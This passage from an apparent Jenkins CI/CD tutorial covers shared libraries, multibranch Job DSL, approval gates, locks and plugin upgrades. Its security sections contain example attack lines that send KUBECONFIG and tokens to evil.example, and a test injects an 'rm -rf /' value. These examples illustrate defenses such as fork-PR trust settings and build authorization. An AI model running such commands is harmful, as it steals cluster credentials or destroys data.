        approver: env.APPROVER ?: null, deployedAt: java.time.Instant.now().toString(),
        chart: chartPath, release: release
      ]))
      writeFile file: "deploy-record-${env_}.json", text: record
      archiveArtifacts artifacts: "deploy-record-${env_}.json", fingerprint: true
      // ⭐ and push it to Prometheus for the DORA metrics
      sh '''
        set -uo pipefail
        cat > /tmp/deploy.prom <<EOF
        # TYPE jenkins_deploy_total counter
        jenkins_deploy_total{environment="'"$ENV_NAME"'",result="success"} 1
        # TYPE jenkins_deploy_timestamp_seconds gauge
        jenkins_deploy_timestamp_seconds{environment="'"$ENV_NAME"'"} $(date +%s)
        EOF
        curl -sf --data-binary @/tmp/deploy.prom \
          "http://kps-kube-prometheus-stack-prometheus-pushgateway.monitoring:9091/metrics/job/deploy/environment/$ENV_NAME" \
          || echo "  ⚠️  the Pushgateway is unreachable"
      '''
    }
  }
}
```

```groovy
// vars/standardPipeline.groovy ⭐⭐ THE WHOLE PIPELINE IN ONE CALL
def call(Map config = [:]) {
  def services   = config.services   ?: ['shop-api', 'checkout', 'order-worker', 'shop-ui']
  def languageOf = config.languageOf ?: [
    'shop-api': 'java', 'checkout': 'go', 'order-worker': 'python',
    'shop-ui': 'node', 'payment-mock': 'go']
  def environments = config.environments ?: ['dev', 'staging', 'production']
  def deployToProduction = config.deployToProduction != null ? config.deployToProduction : true
  def maxCritical = config.maxCritical ?: 0

  pipeline {
    agent { kubernetes { inheritFrom 'shop-base' } }
    options {
      timestamps(); ansiColor('xterm')
      timeout(time: 90, unit: 'MINUTES')
      buildDiscarder(logRotator(numToKeepStr: '50', daysToKeepStr: '90'))
      disableConcurrentBuilds()
      skipDefaultCheckout(true)
    }
    stages {
      stage('Checkout')  { steps { checkout scm } }
      stage('Lint')      { steps { sh './ci/lint.sh' } }
      stage('Test') {
        steps {
          script {
            def branches = [:]
            services.each { svc ->
              branches["test-${svc}"] = {
                container(containerFor(languageOf[svc])) {
                  dir("apps/${svc}") { sh "../../ci/test-${languageOf[svc]}.sh" }
                }
              }
            }
            parallel branches
          }
        }
        post { always { junit allowEmptyResults: true, testResults: '**/junit*.xml,**/TEST-*.xml' } }
      }
      stage('Build') {
        when { allOf { branch 'main'; not { changeRequest() } } }
        steps { services.each { svc -> buildAndPushImage(service: svc) } }
      }
      stage('Scan and sign') {
        when { branch 'main' }
        steps { scanAndSign(services: services, maxCritical: maxCritical) }
      }
    }
    // ⭐ the environments are generated, not hardcoded
    post {
      always  { cleanWs(deleteDirs: true, notFailBuild: true) }
      success { notifySlack(text: "✅ ${env.JOB_NAME} #${env.BUILD_NUMBER}", color: 'good') }
      failure { notifySlack(text: "⛔ ${env.JOB_NAME} #${env.BUILD_NUMBER} FAILED", color: 'danger') }
      unstable{ notifySlack(text: "⚠️ ${env.JOB_NAME} #${env.BUILD_NUMBER} UNSTABLE", color: 'warning') }
    }
  }
}

@NonCPS
private String containerFor(String lang) {
  ['java':'java', 'go':'tools', 'python':'tools', 'node':'tools'][lang] ?: 'jnlp'
}
```

```groovy
// ⭐⭐ and the consumer's ENTIRE Jenkinsfile becomes three lines:
@Library('shop-shared@v2.4.1') _
standardPipeline(
  services: ['shop-api', 'checkout', 'order-worker', 'shop-ui'],
  environments: ['dev', 'staging', 'production'],
  maxCritical: 0
)
```

### 4.3 `src/` — classes for real logic

```groovy
// src/com/shop/ci/Deployer.groovy
package com.shop.ci

import groovy.json.JsonOutput

class Deployer implements Serializable {          // ⭐⭐ Serializable is REQUIRED
  private static final long serialVersionUID = 1L

  final Script script                              // ⭐ the pipeline's `this`
  final String environment
  final String namespace
  final String release

  Deployer(Script script, Map config) {
    this.script = script
    this.environment = config.environment
    this.namespace   = config.namespace ?: 'shop'
    this.release     = config.release ?: 'shop'
    validate()
  }

  // ⭐⭐ @NonCPS for anything that uses a non-serializable object
  @NonCPS
  private void validate() {
    assert environment in ['dev', 'staging', 'production'] : "bad environment: $environment"
    assert namespace ==~ /[a-z0-9]([-a-z0-9]*[a-z0-9])?/ : "bad namespace: $namespace"
  }

  void deploy(String revision) {
    script.echo "deploying ${revision.take(7)} to ${environment}"
    def previousRevision = currentRevision()
    try {
      script.sh "./scripts/deploy.sh ${environment} ${revision}"
      verify(revision)
    } catch (Exception e) {
      script.echo "⛔ the deploy failed — rolling back to ${previousRevision?.take(7)}"
      if (previousRevision) { rollback(previousRevision) }
      throw e
    }
  }

  String currentRevision() {
    script.sh(returnStdout: true,
      script: "kubectl -n ${namespace} get deploy ${release}-api " +
              "-o jsonpath='{.metadata.annotations.deployed-revision}'").trim() ?: null
  }

  void verify(String revision) {
    def actual = script.sh(returnStdout: true,
      script: "kubectl -n ${namespace} get deploy ${release}-api " +
              "-o jsonpath='{.metadata.annotations.deployed-revision}'").trim()
    if (actual != revision) {
      throw new IllegalStateException("expected ${revision.take(7)} but the cluster has ${actual?.take(7)}")
    }
    script.echo "  ✅ verified: the cluster is running ${revision.take(7)}"
  }

  void rollback(String revision) {
    script.sh "helm rollback ${release} -n ${namespace} --wait"
  }

  String renderManifests(String revision) {
    script.sh(returnStdout: true,
      script: "helm template ${release} helm/shop -n ${namespace} " +
              "--values helm/values/${environment}.yaml --set image.revision=${revision}")
  }
}

// ⭐ usage from a vars/ step:
//   def d = new Deployer(this, [environment: 'staging'])
//   d.deploy(env.GIT_COMMIT)
```

### 4.4 `resources/` — non-Groovy files

```groovy
// ⭐ read a file from the LIBRARY (not from the checked-out repo)
def podYaml = libraryResource('pod-templates/kaniko.yaml')
// ⭐ and interpolate safely
podYaml = podYaml.replace('{{BUILD_NUMBER}}', env.BUILD_NUMBER)
                  .replace('{{REGISTRY}}', env.REGISTRY)
agent { kubernetes { yaml podYaml } }

// ⭐ a JSON template for Slack
def tpl = new groovy.json.JsonSlurper().parseText(libraryResource('slack-templates/deploy.json'))
tpl.attachments[0].title = "🚀 ${env.environment} deployed"
```

### 4.5 ⭐ Testing the library (JenkinsPipelineUnit)

```groovy
// test/groovy/com/shop/ci/NotifySlackTest.groovy
import com.lesfurets.jenkins.unit.declarative.DeclarativePipelineTest
import org.junit.Before
import org.junit.Test
import static org.junit.Assert.*

class NotifySlackTest extends DeclarativePipelineTest {

  @Override
  @Before
  void setUp() throws Exception {
    super.setUp()
    helper.scriptExtension = '.groovy'
    helper.baseClassloader = this.class.classLoader
    // ⭐ register the vars/ directory so `notifySlack(...)` resolves
    helper.registerAllowedMethod('withCredentials', [List, Closure], null)
    helper.registerAllowedMethod('writeFile', [Map], null)
    helper.registerAllowedMethod('sh', [String], null)
    helper.registerAllowedMethod('sh', [Map], null)
    helper.registerAllowedMethod('echo', [String], null)
    // ⭐ the environment the step expects
    binding.setVariable('env', [
      JOB_NAME: 'shop/main', BUILD_NUMBER: '47', BUILD_URL: 'https://j/47/',
      GIT_BRANCH: 'main', GIT_COMMIT: 'a1b2c3d4e5f6',
    ])
    binding.setVariable('currentBuild', [
      currentResult: 'SUCCESS', durationString: '4 min 12 sec',
      getBuildCauses: { String s = null -> [[shortDescription: 'Started by user harish']] }
    ])
  }

  @Test
  void 'a SUCCESS build produces a good-coloured payload'() {
    def script = loadScript('vars/notifySlack.groovy')
    def captured = null
    helper.registerAllowedMethod('writeFile', [Map], { m -> captured = m.text })
    script.call(text: '✅ deployed', color: 'good')
    assertNotNull(captured)
    def json = new groovy.json.JsonSlurper().parseText(captured)
    assertEquals('good', json.attachments[0].color)
    assertEquals('✅ deployed', json.attachments[0].title)
    assertTrue(json.attachments[0].title_link.contains('/47/'))
    printCallStack()                                     // ⭐ see the calls
    assertJobStatusSuccess()
  }

  @Test
  void 'a Slack failure does NOT fail the build'() {
    def script = loadScript('vars/notifySlack.groovy')
    helper.registerAllowedMethod('sh', [String], { s -> throw new RuntimeException('curl failed') })
    script.call(text: 'x')                               // must not throw
    assertJobStatusSuccess()
  }

  @Test
  void 'the payload never contains an unescaped user value'() {
    binding.setVariable('env', binding.getVariable('env') + [CHANGE_TITLE: 'a"; rm -rf / #'])
    def script = loadScript('vars/notifySlack.groovy')
    def captured = null
    helper.registerAllowedMethod('writeFile', [Map], { m -> captured = m.text })
    script.call(text: 'x')
    // ⭐ the untrusted value went through JsonOutput.toJson → it is escaped
    assertFalse(captured.contains('"; rm -rf'))
    assertTrue(captured.contains('a\\"; rm -rf'))
  }
}
```

```groovy
// the library's OWN Jenkinsfile
pipeline {
  agent { kubernetes { inheritFrom 'shop-base' } }
  stages {
    stage('Unit tests') {
      steps {
        container('java') {
          sh '''
            set -euo pipefail
            # JenkinsPipelineUnit via Gradle or Maven
            ./gradlew test --info
          '''
        }
      }
      post { always { junit 'build/test-results/test/*.xml' } }
    }
    stage('Lint') {
      steps { sh 'npm-groovy-lint --failon error src vars test' }
    }
    stage('Contract test ⭐') {
      steps {
        // ⭐ load the library in a REAL pipeline and assert the steps exist
        sh '''
          set -euo pipefail
          for step in notifySlack deployTo buildAndPushImage productionGate standardPipeline; do
            test -f "vars/${step}.groovy" || { echo "⛔ vars/${step}.groovy is missing"; exit 1; }
            grep -q "def call" "vars/${step}.groovy" || { echo "⛔ ${step} has no call()"; exit 1; }
            echo "  ✅ ${step}"
          done
          # ⭐ every public step documented in docs/API.md
          for f in vars/*.groovy; do
            n=$(basename "$f" .groovy)
            grep -q "### \`$n\`" docs/API.md || { echo "⛔ $n is not documented"; exit 1; }
          done
        '''
      }
    }
    stage('Release') {
      when { branch 'main'; changesSince lastSuccessfulBuild() }
      steps {
        sh '''
          set -euo pipefail
          V=$(grep -oE '^version: .*' library.yaml | awk '{print $2}')
          git tag -f "v${V%%.*}" "v$V" && git push -f origin "v${V%%.*}" "v$V"
        '''
      }
    }
  }
}
```

---

## 5 · Multibranch pipelines ⭐

```
A Multibranch Pipeline job:
  · points at a Git repository
  · DISCOVERS every branch and every pull request
  · creates a JOB PER BRANCH automatically
  · runs the Jenkinsfile from THAT branch  ⭐⭐ (so a PR may change its own pipeline)
  · applies branch-specific behaviour via `when { branch … }` / `changeRequest()`
```

### 5.1 Creating one with Job DSL ⭐ (configuration as code)

```groovy
// jobs/shop.groovy — run via a "Seed Job" (a Freestyle job that runs Job DSL)
folder('shop') {
  displayName('🛒 The shop application')
  description('CI/CD for the shop monorepo')
  primaryView('all')
  properties {
    folderCredentialsProperty {
      domainCredentials {
        credentials {
          stringCredentials {
            scope('GLOBAL'); id('ghcr-token')
            secret('ghp_REPLACE_ME'); description('GHCR push token')
          }
          fileCredentials {
            scope('GLOBAL'); id('kubeconfig-staging')
            fileName('kubeconfig'); secretBytes(Util.readFileAsBase64('/tmp/kubeconfig-staging'))
            description('The staging cluster')
          }
        }
      }
    }
  }
}

// ⭐ the nested production folder — so production credentials are scoped away
folder('shop/production') {
  displayName('🚀 Production')
  description('Only jobs that may touch production live here')
}

multibranchPipelineJob('shop/main') {
  displayName('🛒 shop (multibranch)')
  description('Discovers branches and PRs on 3558Bhk/shop')
  branchSources {
    github {
      id('shop-github')                       // ⭐⭐ STABLE — changing this re-imports everything
      repoOwner('3558Bhk')
      repository('shop')
      credentialsId('github-bot')
      // ⭐⭐ WHICH REFS TO BUILD
      buildForkPRHead(true)                   // build the HEAD of a fork PR
      buildForkPRMerge(false)                 // ⭐ don't also build the merge commit
      buildOriginPRHead(false)
      buildOriginPRMerge(true)                // ⭐ build the MERGE commit for same-repo PRs
      buildOriginBranch(true)                 // ⭐ build branches
      buildOriginBranchWithPR(false)          // ⭐ don't double-build a branch that has a PR
      buildOriginTag(true)                    // ⭐ build tags → the release pipeline
      // ⭐ the discovery traits
      configureBeforeCheckout(true)
      traits {
        gitHubBranchDiscovery {
          strategyId(1)                       // 1 = exclude branches that are also PRs
        }
        pullRequestDiscoveryTrait {
          strategyId(2)                       // 2 = merge commit + head
        }
        forkPullRequestDiscoveryTrait {
          strategyId(2)
          // ⭐⭐ THE TRUST STRATEGY — the security-critical setting
          trust(class: forkPullRequestDiscoveryTrait.trustPermission())
          //   trustNobody()        → ⭐⭐ NEVER trust a fork PR's Jenkinsfile
          //   trustPermission()    → trust if the author has write access
          //   trustEveryone()      → ⛔⛔ NEVER
        }
        originMergeRequestDiscoveryTrait { }
        // ⭐ limit WHICH branches are discovered
        headWildcardFilter {
          includes('main develop release/* feature/*')
          excludes('wip/* experiment/* dependabot/*')
        }
        // ⭐ only discover when a Jenkinsfile exists
        gitHubSCMSourceTrait { }
        cloneOptionTrait {
          extension { shallowClone(depth: 1) }
        }
        // ⭐ the checkout behaviour
        cleanBeforeCheckoutTrait()
        wipeWorkspaceTrait()
      }
    }
  }
  // ⭐⭐ the orphaned-item strategy — what happens to a deleted branch's job
  orphanedItemStrategy {
    discardOldItems {
      numToKeep(20)
      daysToKeep(30)
    }
  }
  // ⭐ how often to re-scan (webhooks are better)
  triggers {
    periodicFolderTrigger { interval('5m') }     // ⭐ a backstop for missed webhooks
  }
  // ⭐ the factory — how each branch's job is configured
  factory {
    workflowBranchProjectFactory {
      scriptPath('Jenkinsfile')                  // ⭐ the Jenkinsfile IN each branch
    }
  }
}

// ⭐ the production deploy job — a SEPARATE, non-multibranch pipeline
pipelineJob('shop/production/deploy') {
  displayName('🚀 Production deploy')
  description('The only job allowed to touch production')
  definition {
    cpsScm {
      scm { git {
        remote { url('https://github.com/3558Bhk/shop.git'); credentials('github-bot') }
        branches('*/main')
      }}
      scriptPath('ci/production-deploy.Jenkinsfile')
      lightweight(true)                            // ⭐ fetch only the Jenkinsfile
    }
  }
  properties {
    disableConcurrentBuilds()
    buildDiscarder { strategy { logRotator { numToKeepStr('200'); daysToKeepStr('365') } } }
    // ⭐⭐ only specific people may run this job
    authorization {
      permission('hudson.model.Item.Build', 'sre-team')
      permission('hudson.model.Item.Read', 'developers')
      permission('hudson.model.Item.Configure', 'sre-team')
      permission('hudson.model.Item.Cancel', 'sre-team')
      // ⛔ do NOT grant Build to 'anonymous' or 'authenticated'
    }
  }
  parameters {
    choiceParam('ENVIRONMENT', ['production'], 'The target')
    stringParam('REVISION', '', 'The git SHA to deploy (blank = latest main)')
    booleanParam('DRY_RUN', false)
  }
}
```

```bash
# ⭐ the seed job: a Freestyle pipeline that runs the DSL
# Manage Jenkins → New Item → "seed" → Pipeline →
#   Definition: Pipeline script
#     @Library('job-dsl') _
#     pipeline { agent none
#       stages { stage('seed') { steps {
#         script {
#           ['jobs/shop.groovy', 'jobs/platform.groovy'].each { f ->
#             evaluate(readFileFromWorkspace(f))     // or: jobDsl(scriptText: …)
#           }
#         }
#       }}}}
#     }
# ⭐ better: the Job DSL plugin's own step
#   jobDsl targets: 'jobs/*.groovy',
#        removedJobAction: 'DISABLE',           # ⭐⭐ DISABLE, never DELETE — preserves history
#        removedViewAction: 'IGNORE',
#        lookupStrategy: 'SEED_JOB',
#        additionalClasspath: 'src/main/groovy'
```

### 5.2 ⭐⭐ The fork-PR security problem

```
A multibranch pipeline builds the Jenkinsfile FROM THE BRANCH BEING BUILT.
For a fork PR, that means ⛔ AN ATTACKER WRITES YOUR PIPELINE.

They can put this in their Jenkinsfile:
    sh 'cat $KUBECONFIG; env | grep -i token; curl -XPOST evil.example -d @/var/run/secrets/…'

THE DEFENSES, ALL OF WHICH YOU NEED:

1. ⭐⭐ trustNobody() on the forkPullRequestDiscoveryTrait
   → Jenkins uses the TARGET branch's Jenkinsfile for fork PRs, not the fork's.
   → The attacker's code still builds (that's the point of CI) but the PIPELINE
     is yours. This is the equivalent of GitHub's `pull_request` (not `_target`).

2. ⭐ credentials scoped to FOLDERS, and the multibranch job in a folder
   that has NO production credentials. The production deploy is a SEPARATE job
   in shop/production/ with its own credentials and its own authorization.

3. ⭐ the built-in node has 0 executors; agents are ephemeral pods with
   automountServiceAccountToken: false.

4. ⭐ a webhook/trigger policy: don't build fork PRs from first-time contributors
   without approval. (GitHub Branch Source has "Discover pull requests from
   public forks" with a trust strategy; combine with a manual gate.)

5. ⭐⭐ and if you MUST run a fork's Jenkinsfile (you shouldn't):
   run it in an isolated cloud, with no credentials at all, and treat the
   output as untrusted data.
```

---

## 6 · Environments, approvals and the production mutex

### 6.1 The four mechanisms ⭐

```
GitHub Actions has `environment:` with required reviewers.
Azure DevOps has Environments with six kinds of checks.
Jenkins has FOUR SEPARATE MECHANISMS you compose yourself:

  1. `input`                        → a human approval gate (a pause)
  2. Lockable Resources plugin      → a mutex ("only one deploy at a time")
  3. Milestone plugin               → "cancel older builds waiting at this point"
  4. Folder/job authorization       → WHO may run or approve
  5. `when { expression { … } }`    → the programmatic gate (time windows, SLOs)

⭐ Jenkins is more flexible and less safe: nothing stops you from forgetting one.
```

### 6.2 The `input` step, properly

```groovy
stage('🚀 Production') {
  steps {
    script {
      // ⭐⭐ a timeout that FAILS SAFELY (a hung approval must not hang forever)
      timeout(time: 8, unit: 'HOURS') {
        def outcome = null
        try {
          outcome = input(
            id: 'prod-approval',                       // ⭐ a stable ID for the API
            message: '''
🚀 PRODUCTION DEPLOYMENT REQUESTED

  Please verify the checklist before approving.
''',
            ok: '✅ Approve and deploy',
            // ⭐⭐ WHO may approve — a user or a GROUP
            submitter: 'sre-team,release-managers,harish',
            submitterParameter: 'APPROVER',            // ⭐ captured into env.APPROVER
            // ⭐ additional parameters collected AT APPROVAL TIME
            parameters: [
              choice(name: 'STRATEGY', choices: ['rolling', 'canary', 'blue-green'],
                     description: 'The deployment strategy'),
              booleanParam(name: 'PAUSE_AFTER_CANARY', defaultValue: true),
              string(name: 'CHANGE_TICKET', defaultValue: '',
                     description: '⭐ The ServiceNow/Jira ticket ID (required)'),
              text(name: 'APPROVER_NOTES', defaultValue: ''),
            ],
            canCancel: true                            // ⭐ others may cancel while waiting
          )
          // ⭐ `input` with parameters returns a MAP
          env.APPROVER        = outcome.APPROVER ?: outcome.toString()
          env.DEPLOY_STRATEGY = outcome.STRATEGY
          env.CHANGE_TICKET   = outcome.CHANGE_TICKET

          // ⭐⭐ VALIDATE WHAT THE APPROVER ENTERED
          if (!env.CHANGE_TICKET?.trim()) {
            error('⛔ a change ticket ID is required to deploy to production')
          }
          if (!(env.CHANGE_TICKET ==~ /^(CHG|SRE)-\d{4,}$/)) {
            error("⛔ '${env.CHANGE_TICKET}' is not a valid ticket ID (expected CHG-12345)")
          }
          echo "  ✅ approved by ${env.APPROVER} against ${env.CHANGE_TICKET}"

        } catch (org.jenkinsci.plugins.workflow.steps.FlowInterruptedException e) {
          // ⭐⭐ a TIMEOUT or a REJECT lands here — never silently continue
          def cause = e.causes*.shortDescription.join(', ')
          echo "⛔ the production approval was not granted: ${cause}"
          currentBuild.description = "⛔ ${cause}"
          notifySlack(text: "⛔ production approval NOT granted — ${cause}", color: 'warning')
          // ⭐ was it a timeout or a reject?
          if (cause.contains('Timeout')) {
            error('the approval timed out after 8 hours')
          } else {
            currentBuild.result = 'ABORTED'
            error('the deployment was rejected')
          }
        }
      }
    }
  }
}
```

```bash
# ⭐ approving from the CLI/API (for drills and automation)
BUILD=47
# find the pending input
curl -s -u "user:$TOKEN" \
  "https://jenkins.shop.example.com/job/shop/job/main/$BUILD/wfapi/describe" | jq '.stages[] | select(.status=="PAUSED_PENDING_INPUT")'
curl -s -u "user:$TOKEN" \
  "https://jenkins.shop.example.com/job/shop/job/main/$BUILD/wfapi/pendingInputActions" | jq
# approve
curl -s -XPOST -u "user:$TOKEN" \
  "https://jenkins.shop.example.com/job/shop/job/main/$BUILD/input/prod-approval/submit" \
  --data-urlencode 'json={"parameter":[{"name":"STRATEGY","value":"canary"},{"name":"CHANGE_TICKET","value":"CHG-12345"}]}'
# reject
curl -s -XPOST -u "user:$TOKEN" \
  "https://jenkins.shop.example.com/job/shop/job/main/$BUILD/input/prod-approval/abort"
```

### 6.3 Lockable Resources — the mutex

```groovy
// ⭐ THE BASIC LOCK
lock('deploy-production') {
  sh './scripts/deploy.sh production'
}
// → a second build that reaches this line WAITS. It does not fail, does not run.

// ⭐ WITH OPTIONS
lock(resource: 'deploy-production',
     label: 'any-production-resource',       // ⭐ or lock by LABEL (any one of a set)
     extra: [[resource: 'shop-database'],    // ⭐⭐ MULTIPLE locks, acquired atomically
             [resource: 'shop-ingress']],
     inversePrecedence: true,                // ⭐ LAST in, FIRST served (a queue drains)
     skipIfLocked: false,                    // ⭐ true = skip the block if locked
     quantity: 1,                            // ⭐ for a lock with N slots
     variable: 'LOCKED_RESOURCES') {          // ⭐ the acquired names, comma-separated
  echo "I hold: ${LOCKED_RESOURCES}"
  sh './scripts/deploy.sh production'
}

// ⭐⭐ THE MIGRATION LOCK — the one people forget
// A database migration and a deploy must not interleave.
lock(resource: 'shop-production-db-migration', inversePrecedence: true) {
  sh './scripts/migrate.sh production'
}
// …then separately…
lock(resource: 'deploy-production') {
  sh './scripts/deploy.sh production'
}

// ⭐ reserving resources in advance (Manage Jenkins → Lockable Resources)
//   Name: deploy-production     Description: the production deploy mutex
//   Name: shop-staging-db       Labels: database,staging
//   Name: gpu-runner-1..4       Labels: gpu     ⭐ quantity-style pooling
```

### 6.4 Milestone — cancel superseded builds

```groovy
// ⭐ the Milestone plugin: "only the LATEST build may pass this point"
stage('Prepare') {
  steps { milestone() }        // ⭐ any EARLIER build still running is ABORTED here
}
stage('Deploy') {
  steps { milestone() }        // ⭐ again — so a build that started later wins
  // ⭐ the classic pattern:
  //   milestone()  at the START  → kill superseded builds early
  //   …build and test…
  //   milestone()  BEFORE deploy → kill anything that got superseded during the build
  //   …deploy…
}
// ⭐⭐ combine with disableConcurrentBuilds() — milestone handles the RACE,
//    disableConcurrentBuilds handles the QUEUE.
```

### 6.5 The programmatic gate (time windows, SLOs)

```groovy
// vars/productionGate.groovy ⭐
def call(Map config = [:]) {
  def environment = config.environment ?: 'production'
  def allowOverride = config.allowOverride ?: false

  stage('🛡️ Production gate') {
    script {
      // ⭐⭐ 1. the deployment window — computed in Groovy, not in bash
      def now = java.time.ZonedDateTime.now(java.time.ZoneId.of('Asia/Kolkata'))
      def day = now.dayOfWeek
      def hour = now.hour
      def allowed = day in [java.time.DayOfWeek.MONDAY, java.time.DayOfWeek.TUESDAY,
                            java.time.DayOfWeek.WEDNESDAY, java.time.DayOfWeek.THURSDAY] &&
                    hour >= 10 && hour < 17
      echo "  now: ${day} ${hour}:00 IST → ${allowed ? '✅ inside' : '⛔ OUTSIDE'} the window"

      // ⭐ 2. the SLO burn rate + firing alerts + recent deploys
      def rc = sh(returnStatus: true, script: '''
        set -uo pipefail
        ./scripts/production-gate.sh
      ''')

      // ⭐ 3. the verdict
      if (!allowed || rc != 0) {
        if (!allowOverride) {
          notifySlack(text: "⛔ the production gate REFUSED the deploy (${day} ${hour}:00 IST, script rc=$rc)",
                      color: 'danger')
          error("⛔ the production gate refused: window=${allowed}, script=${rc}")
        }
        // ⭐ the override path — recorded loudly
        def overrideReason = env.GATE_OVERRIDE_REASON?.trim()
        if (!overrideReason || overrideReason.length() < 20) {
          error('⛔ an override requires GATE_OVERRIDE_REASON of at least 20 characters')
        }
        echo "⚠️  GATE OVERRIDDEN by ${env.APPROVER ?: 'unknown'}: ${overrideReason}"
        notifySlack(text: "🚨 the production gate was OVERRIDDEN by ${env.APPROVER}: ${overrideReason}",
                    color: 'warning')
        writeFile file: 'gate-overrides.jsonl',
                  text: groovy.json.JsonOutput.toJson([ts: java.time.Instant.now().toString(),
                    by: env.APPROVER, reason: overrideReason, build: env.BUILD_URL]) + '\n'
        archiveArtifacts 'gate-overrides.jsonl'
      } else {
        echo '  ✅ the production gate passed'
      }
    }
  }
}
```

---

## 7 · Plugins, security and upgrades

### 7.1 The essential plugin list

```
CORE PIPELINE
  workflow-aggregator         ⭐ the Pipeline plugin bundle
  pipeline-stage-view         the stage graph on the build page
  blueocean                   ⭐ the modern UI, editor and graph view
  pipeline-utility-steps      readJSON, writeJSON, readCSV, findFiles ⭐ very useful
  pipeline-github-lib         `library 'owner/repo@ref'` inline from GitHub
  pipeline-graph-view         ⭐ a lighter Blue Ocean alternative
  durable-task                the `sh` step's implementation

SCM
  git                         ⭐
  github                      ⭐
  github-branch-source        ⭐⭐ multibranch + PR discovery
  branch-api                  the folder/branch abstraction
  basic-branch-build-strategies  ⭐ controls WHEN a branch builds
  git-client, credentials, ssh-credentials, plain-credentials

AGENTS
  kubernetes                  ⭐⭐ dynamic pod agents
  docker-workflow             `docker.build()`, `docker.withRegistry()`
  docker-plugin               (only if you use Docker clouds)

BUILD RESULT HANDLING
  junit                       ⭐ test results
  cobertura / jacoco          coverage
  htmlpublisher               ⭐ publish any HTML report
  warnings-ng                   ⭐⭐ aggregates compiler/linter/scanner warnings
  checks-api                    shows checks on the PR
  echarts-api                   the warnings-ng charts

CONTROL AND SAFETY
  lockable-resources          ⭐⭐ the mutex
  milestone-step              ⭐ cancel superseded builds
  build-timeout               ⭐ kill a hung step
  naginator                   ⭐ retry a failed build automatically
  throttle-concurrents        ⭐ limit how many of a job run at once
  ws-cleanup                  ⭐ cleanWs()
  timestamper                 ⭐ timestamps in logs
  rebuild                     ⭐ re-run with the same parameters
  parameterized-trigger       trigger another job with parameters

SECURITY
  ⭐ script-security          the Groovy sandbox — DO NOT DISABLE
  matrix-auth / role-strategy ⭐ authorization
  authorize-project           ⭐⭐ WHOSE identity a build runs as — CRITICAL
  antisamy-markup-formatter   sanitizes HTML in build descriptions
  dark-theme                  (cosmetic, but reduces eye strain)
  ⭐ credentials-binding      withCredentials
  ⭐ oidc-provider            Jenkins as an OIDC issuer (§4.6)
  ⭐ hashicorp-vault-plugin   Vault integration
  job-config-history          ⭐⭐ WHO changed a job config, and when — the audit trail
  audit-trail                 ⭐ logs every admin action to a file/syslog
  ⭐ folder-auth              per-folder permissions
  ⭐ same-remoting-security   (part of core now)

CONFIGURATION
  ⭐⭐ configuration-as-code   JCasC — the whole controller config in Git
  ⭐ job-dsl                  define jobs as code
  ⭐ gitlab-plugin / gitea    (if you're not on GitHub)

OBSERVABILITY
  ⭐ prometheus               /prometheus metrics endpoint
  monitoring                  the built-in health page
  ⭐ build-monitor-view       the wall-of-builds TV display
  log-parser                  classify console output by regex
```

### 7.2 ⭐ The `authorize-project` plugin — the identity question

```
⛔ THE QUESTION MOST JENKINS SHOPS GET WRONG:
   "When a build runs, WHOSE permissions does it have?"

By default: the SYSTEM's. Which means ANY user who can trigger a build can
do anything the Jenkins system can do — including reading every credential
that the job's scope allows.

THE ATTACK:
  1. Alice may not read the `production-kubeconfig` credential.
  2. Alice CAN configure the `shop/dev-build` job (she's a developer).
  3. Alice adds: withCredentials([file(credentialsId:'production-kubeconfig', …)])
     { sh 'curl -XPOST evil.example --data-binary @"$KUBECONFIG"' }
  4. Alice triggers the build. ⛔ It runs as SYSTEM. It reads the credential.

THE FIX: the `authorize-project` plugin.
  Manage Jenkins → Security → ⭐ "Build Authorization" / "Project default build authorization"
    → "Run as User who Triggered Build"       ⭐⭐ THE ONE TO CHOOSE
    → or "Run as Specific User" (a dedicated service account)
    → or "Run as User who Last Configured Job"
  Then the build runs with ALICE's permissions, and step 3 fails with
  "Access denied: alice is missing the Credentials/Use permission."

  ⭐⭐ AND combine with a per-folder authorization:
     Folder `shop/production/` → the `deploy` job's authorization strategy
       → "Run as Specific User": shop-deployer
       → only the sre-team may trigger it
```

### 7.3 The Script Approval queue

```
Manage Jenkins → In-process Script Approval

Jenkins runs Jenkinsfile Groovy in a SANDBOX. Methods not on the allowlist are
BLOCKED with:
  ⛔ "Scripts not permitted to use method groovy.json.JsonSlurper parseText java.lang.String"

You have three choices:
  1. ⭐ REWRITE to avoid it — usually possible, always better
  2. ⭐ use @NonCPS or a shared library (library code is NOT sandboxed if the
     library is trusted — see below)
  3. ⛔ approve it globally — which grants the method to EVERY pipeline

APPROVING IS A GLOBAL SECURITY DECISION. `method jenkins.model.Jenkins getInstance`
gives every pipeline full admin. Approve only what you'd give to every team.

⭐ THE BETTER ANSWER: put the dangerous logic in the shared library's `src/`
   classes. A shared library marked "trusted" (via the `@Library` from a
   configured Global Pipeline Library) runs OUTSIDE the sandbox — with full
   Groovy — because it was reviewed and versioned by the platform team.
   App teams' Jenkinsfiles stay sandboxed.
```

### 7.4 Plugin updates — the safe procedure

```bash
# ⛔ NEVER click "Select all" → "Download now and install after restart"
#    on a production Jenkins. That's how you lose a weekend.

# ⭐ THE PROCEDURE
# 1. know what you have
kubectl -n jenkins exec sts/jenkins -c jenkins -- jenkins-plugin-cli --list
# or the CLI:
ssh -p 50000 admin@jenkins list-plugins | sort

# 2. ⭐ bake them into the image — the reproducible answer
cat > Dockerfile <<'EOF'
FROM jenkins/jenkins:2.568.3-lts
USER root
RUN apt-get update && apt-get install -y --no-install-recommends \
      curl git jq yq shellcheck && rm -rf /var/lib/apt/lists/*
USER jenkins
# ⭐⭐ a PINNED plugin list — the same one as values.yaml's installPlugins
COPY plugins.txt /usr/share/jenkins/ref/plugins.txt
RUN jenkins-plugin-cli --plugin-file /usr/share/jenkins/ref/plugins.txt \
    --verbose --latest false
EOF

cat > plugins.txt <<'EOF'
kubernetes:4333.v37a_1a_f6d5b_a_1
workflow-aggregator:608.v67378e9d3db_1
configuration-as-code:1932.v79cb_1a_b_f1c9f7
job-dsl:1.89
git:5.7.0
github:1.41.0
github-branch-source:1826.v25e5c1e2f6a_c
credentials-binding:687.v619cb_57e983f
plain-credentials:189.va_6a_dd1c1a_4c4
lockable-resources:1385.v089dd83a_b_a_11
blueocean:1.27.17
timestamper:1.27
ws-cleanup:0.47
authorize-project:2.0.0
role-strategy:747.vc8b_2a_4b_1a_9f3
matrix-auth:3.2.5
job-config-history:1402.va_1f7d7f9b_9b_5
audit-trail:3.20
prometheus:797.v3c4b_f4b_42a_71
oidc-provider:2.5
hashicorp-vault-plugin:3.21.0
junit:1333.vf209c24d8b_0f
warnings-ng:11.6.v1b_c46a_0d3c0d
htmlpublisher:1.38
